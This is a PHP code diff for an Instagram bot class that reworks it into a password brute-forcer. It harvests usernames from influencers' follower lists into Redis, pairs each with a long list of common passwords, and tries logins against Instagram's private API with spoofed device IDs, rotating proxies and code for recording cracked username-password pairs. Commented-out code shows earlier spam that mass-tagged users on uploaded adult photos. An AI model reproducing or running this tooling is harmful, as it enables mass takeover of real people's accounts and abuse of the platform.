@@ -26,6 +26,7 @@ class InstaOS  extends Threaded
   protected $anon_id;
   protected $session_id;
 
+  protected $cookies_enabled;
 
  
 
@@ -47,7 +48,7 @@ public function run() {
 
       // this data from redis
       $proxy_string = $this->redis->spop('proxy');
-      $exploded_proxy = explode(":", $proxy_string);
+      // $exploded_proxy = explode(":", $proxy_string);
 
       $this->proxy = null;//$exploded_proxy[0].":".$exploded_proxy[1];  
       $this->proxy_auth_credentials = null; //$exploded_proxy[2].":".$exploded_proxy[3];  
@@ -56,10 +57,36 @@ public function run() {
 
 
       // credentials for brute
+      // $pass_list = ["123456", "password", "12345678", "1234", "pussy", "12345", "dragon", "qwerty", "696969", "mustang", "letmein", "baseball", "master", "michael", "football", "shadow", "monkey", "abc123", "pass", "fuckme", "6969", "jordan", "harley", "ranger", "iwantu", "jennifer", "hunter", "fuck", "2000", "test", "batman", "trustno1", "thomas", "tigger", "robert", "access", "love", "buster", "1234567", "soccer", "hockey", "killer", "george", "sexy", "andrew", "charlie", "superman", "asshole", "fuckyou", "dallas", "jessica", "panties", "pepper", "1111", "austin", "william", "daniel", "golfer", "summer", "heather", "hammer", "yankees", "joshua", "maggie", "biteme", "enter", "ashley", "thunder", "cowboy", "silver", "richard", "fucker", "orange", "merlin", "michelle", "corvette", "bigdog", "cheese", "matthew", "121212", "patrick", "martin", "freedom", "ginger", "blowjob", "nicole", "sparky", "yellow", "camaro", "secret", "dick", "falcon", "taylor", "111111", "131313", "123123", "bitch", "hello", "scooter", "please", "porsche", "guitar", "chelsea", "black", "diamond", "nascar", "jackson", "cameron", "654321", "computer", "amanda", "wizard", "xxxxxxxx", "money", "phoenix", "mickey", "bailey", "knight", "iceman", "tigers", "purple", "andrea", "horny", "dakota", "aaaaaa", "player", "sunshine", "morgan", "starwars", "boomer", "cowboys", "edward", "charles", "girls", "booboo", "coffee", "xxxxxx", "bulldog", "ncc1701", "rabbit", "peanut", "john", "johnny", "gandalf", "spanky", "winter", "brandy", "compaq", "carlos", "tennis", "james", "mike", "brandon", "fender", "anthony", "blowme", "ferrari", "cookie", "chicken", "maverick", "chicago", "joseph", "diablo", "sexsex", "hardcore", "666666", "willie", "welcome", "chris", "panther", "yamaha", "justin", "banana", "driver", "marine", "angels", "fishing", "david", "maddog", "hooters", "wilson", "butthead", "dennis", "fucking", "captain", "bigdick", "chester", "smokey", "xavier", "steven", "viking", "snoopy", "blue", "eagles", "winner", "samantha", "house", "miller", "flower", "jack", "firebird", "butter", "united", "turtle", "steelers", "tiffany", "zxcvbn", "tomcat", "golf", "bond007", "bear", "tiger", "doctor", "gateway", "gators", "angel", "junior", "thx1138", "porno", "badboy", "debbie", "spider", "melissa", "booger", "1212", "flyers", "fish", "porn", "matrix", "teens", "scooby", "jason", "walter", "cumshot", "boston", "braves", "yankee", "lover", "barney", "victor", "tucker", "princess", "mercedes", "5150", "doggie", "zzzzzz", "gunner", "horney", "bubba", "2112", "fred", "johnson", "xxxxx", "tits", "member", "boobs", "donald", "bigdaddy", "bronco", "penis", "voyager", "rangers", "birdie", "trouble", "white", "topgun", "bigtits", "bitches", "green", "super", "qazwsx", "magic", "lakers", "rachel", "slayer", "scott", "2222", "asdf", "video", "london", "7777", "marlboro", "srinivas", "internet", "action", "carter", "jasper", "monster", "teresa", "jeremy", "11111111", "bill", "crystal", "peter", "pussies", "cock", "beer", "rocket", "theman", "oliver", "prince", "beach", "amateur", "7777777", "muffin", "redsox", "star", "testing", "shannon", "murphy", "frank", "hannah", "dave", "eagle1", "11111", "mother", "nathan", "raiders", "steve", "forever", "angela", "viper", "ou812", "jake", "lovers", "suckit", "gregory", "buddy", "whatever", "young", "nicholas", "lucky", "helpme", "jackie", "monica", "midnight", "college", "baby", "cunt", "brian", "mark", "startrek", "sierra", "leather", "232323", "4444", "beavis", "bigcock", "happy", "sophie", "ladies", "naughty", "giants", "booty", "blonde", "fucked", "golden", "0", "fire", "sandra", "pookie", "packers", "einstein", "dolphins", "0", "chevy", "winston", "warrior", "sammy", "slut", "8675309", "zxcvbnm", "nipples", "power", "victoria", "asdfgh", "vagina", "toyota", "travis", "hotdog", "paris", "rock", "xxxx", "extreme", "redskins", "erotic", "dirty", "ford", "freddy", "arsenal", "access14", "wolf", "nipple", "iloveyou", "alex", "florida", "eric", "legend", "movie", "success", "rosebud", "jaguar", "great", "cool", "cooper", "1313", "scorpio", "mountain", "madison", "987654", "brazil", "lauren", "japan", "naked", "squirt", "stars", "apple", "alexis", "aaaa", "bonnie", "peaches", "jasmine", "kevin", "matt", "qwertyui", "danielle", "beaver", "4321", "4128", "runner", "swimming", "dolphin", "gordon", "casper", "stupid", "shit", "saturn", "gemini", "apples", "august", "3333", "canada", "blazer", "cumming", "hunting", "kitty", "rainbow", "112233", "arthur", "cream", "calvin", "shaved", "surfer", "samson", "kelly", "paul", "mine", "king", "racing", "5555", "eagle", "hentai", "newyork", "little", "redwings", "smith", "sticky", "cocacola", "animal", "broncos", "private", "skippy", "marvin", "blondes", "enjoy", "girl", "apollo", "parker", "qwert", "time", "sydney", "women", "voodoo", "magnum", "juice", "abgrtyu", "777777", "dreams", "maxwell", "music", "rush2112", "russia", "scorpion", "rebecca", "tester", "mistress", "phantom", "billy", "6666", "albert", "qweqwe123", "qweqwe", "qwe123", "123qwe"];
 
+      // foreach ($pass_list as $pass) {
+      //   $this->redis->lpush("passwords", $pass);
+      // }
+
+    
+    while ($this->redis->scard("usernames_retry") > 0 || $this->redis->scard("usernames_clean") > 0 ) {
+
+      if ($this->redis->scard("usernames_retry") == 0 ) {
+        $this->username = $this->redis->spop("usernames_clean"); 
+        $passwords = $this->redis->lrange("passwords", 0 , -1); //"qweqwe";
+        foreach ($passwords as $pwd) {
+          $this->redis->sadd( $this->username , $pwd);
+        } 
+        $this->password = $this->redis->spop($this->username);
+ 
+      } else {
+        $this->username = $this->redis->spop("usernames_retry");  
+        $this->password = $this->redis->spop($this->username);
+      }
+    
+      $this->cookies_enabled = false;
       $this->login();
+    }
 
-      //$this->on_create_new();
+      // // $this->on_create_new();
+      // $this->username = "4ewir";
+      // $this->password  = "qweqwe";
+      // $this->login();
           
 
  }
@@ -171,8 +198,6 @@ public function on_create_new() {
       //   $this->redis->sadd('detect', $fs_next[1]['users'][$iter]['pk'] );
       // } 
 
-
-    
        $this->funcrecur();
 }
 
@@ -226,8 +251,11 @@ public function login() {
   // "device_id":"F30F7D45-024B-478A-A1FC-75EC32B2F629",
   // "login_attempt_count":"1"}&ig_sig_key_version=5
 
+       $this->uuid = $this->generateUUID(true);
+       $this->device_id = $this->generateUUID(true);
 
-      $fetch = $this->request('si/fetch_headers/?challenge_type=signup&guid='.str_replace('-', '', $this->uuid), null, true);
+
+      $fetch = $this->request('https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid='.str_replace('-', '', $this->uuid), null, true);
         
       preg_match('#Set-Cookie: csrftoken=([^;]+)#', $fetch[0], $token);
 
@@ -235,18 +263,29 @@ public function login() {
    //   'phone_id'            => $this->phone_id,  
       '_csrftoken'          => $token[0],
       'username'            => $this->username,
-      'guid'                => $this->uuid,
+      //'guid'                => $this->uuid,
       'device_id'           => $this->device_id,
       'password'            => $this->password,
       'login_attempt_count' => '0',
      ];
 
-      $login = $this->request('accounts/login/', $this->generateSignature(json_encode($data)), true);
+      $login = $this->request('https://i.instagram.com/api/v1/accounts/login/', $this->generateSignature(json_encode($data)), true);
 
-      if ($login[1]['status'] == 'fail') {
-          echo "fail to login";
-          return;
-      }
+      // if ($login[1]['status'] == 'fail') {
+      //     if ($this->redis->scard($this->username) > 0 ) {
+      //      $this->redis->sadd("usernames_retry", $this->username);
+      //     } else {
+      //        $this->redis->sadd("usernames_black", $this->username);
+      //     }
+      //     echo "[scanner] fail to login";
+      //     //return;
+      // } else {
+      //     $this->redis->sadd("brute_succes", $this->username."|".$this->password);
+      //     $this->redis->del($this->username);
+      //     echo "[scanner] success";
+      // }
+
+       $this->funcrecur();
 
 }
 
@@ -540,7 +579,7 @@ public  function funcparse($followers, $influencer)
 {
       $counter = 0;
       for($iter = 0; $iter < count($followers['users']); $iter++) {
-         $this->redis->sadd("detect", $followers['users'][$iter]['pk']);
+         $this->redis->sadd("usernames_clean", $followers['users'][$iter]['username']); //$followers['users'][$iter]['pk']);
       }
           
       $tmpfollowers = $followers;
@@ -564,11 +603,11 @@ public  function funcparse($followers, $influencer)
 public function funcrecur()
 { 
     $time_in_day = 24*60*60;
-    $posts_per_day = 5000;   
+    $posts_per_day = 105000;   
     $delay = $time_in_day / $posts_per_day;
  
 ////////
-    while ($this->redis->scard("detect") < 20000) {   
+    while ($this->redis->scard("usernames_clean") < 500000) {   
       echo $next_iteration_time = $this->add_time($delay);  
       sleep($next_iteration_time);
 
@@ -599,32 +638,35 @@ public function funcrecur()
 
     }
 
-    $dir =  __DIR__.DIRECTORY_SEPARATOR.'adult';
-    $ava_files = array_slice(scandir($dir), 2);
-    $avatar_files_shuffle =  $this->shuffle_assoc($ava_files);
 
-   // upload 20 photos 
-    while ( $this->redis->hlen("media".$this->username_id ) < 1 ) { 
+    //// TAGS
+
+   //  $dir =  __DIR__.DIRECTORY_SEPARATOR.'adult';
+   //  $ava_files = array_slice(scandir($dir), 2);
+   //  $avatar_files_shuffle =  $this->shuffle_assoc($ava_files);
+
+   // // upload 20 photos 
+   //  while ( $this->redis->hlen("media".$this->username_id ) < 1 ) { 
         
-        $avatar_file = $avatar_files_shuffle[mt_rand(0, count($avatar_files_shuffle) - 1)];
-        $photo = $dir ."/". $avatar_file;
+   //      $avatar_file = $avatar_files_shuffle[mt_rand(0, count($avatar_files_shuffle) - 1)];
+   //      $photo = $dir ."/". $avatar_file;
 
-        $act_array = array();
-        for ($i = 0; $i < 2; $i++) {  // 20
-          $actioner = $this->redis->spop('detect');
-          array_push($act_array , $actioner);
-        }
-        $caption = $this->text_generator();
+   //      $act_array = array();
+   //      for ($i = 0; $i < 2; $i++) {  // 20
+   //        $actioner = $this->redis->spop('detect');
+   //        array_push($act_array , $actioner);
+   //      }
+   //      $caption = $this->text_generator();
 
-       // $act_array = array ("1383321789", "253691521");
-        $act_array = array ("1009845355", "253625977" );//, "8144620", "1619800584", "2111407363");
+   //     // $act_array = array ("1383321789", "253691521");
+   //      $act_array = array ("1009845355", "253625977" );//, "8144620", "1619800584", "2111407363");
        
-        $res = $this->upload_photo($photo, $caption, $act_array);
-        $this->redis->hset( "media".$this->username_id, $res['media']['pk'] , implode (",", $act_array) ) ;
+   //      $res = $this->upload_photo($photo, $caption, $act_array);
+   //      $this->redis->hset( "media".$this->username_id, $res['media']['pk'] , implode (",", $act_array) ) ;
           
-        echo $next_iteration_time = $this->add_time($delay);  
-        sleep($next_iteration_time);
-    }
+   //      echo $next_iteration_time = $this->add_time($delay);  
+   //      sleep($next_iteration_time);
+   //  }
 
 
 /////////
@@ -1694,7 +1736,7 @@ public function timeline()
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
         curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
 
-
+     if ($this->cookies_enabled ) { 
          if (file_exists($this->IGDataPath."$this->username-cookies.dat")) {
             curl_setopt($ch, CURLOPT_COOKIEFILE, $this->IGDataPath."$this->username-cookies.dat");
             curl_setopt($ch, CURLOPT_COOKIEJAR, $this->IGDataPath."$this->username-cookies.dat");
@@ -1702,6 +1744,8 @@ public function timeline()
             curl_setopt($ch, CURLOPT_COOKIEFILE, $this->IGDataPath.'cookies.dat');  
             curl_setopt($ch, CURLOPT_COOKIEJAR, $this->IGDataPath.'cookies.dat');      
         }
+      }
+    
 
         if ( $this->proxy != null) {
             curl_setopt($ch, CURLOPT_PROXY, $this->proxy ); 
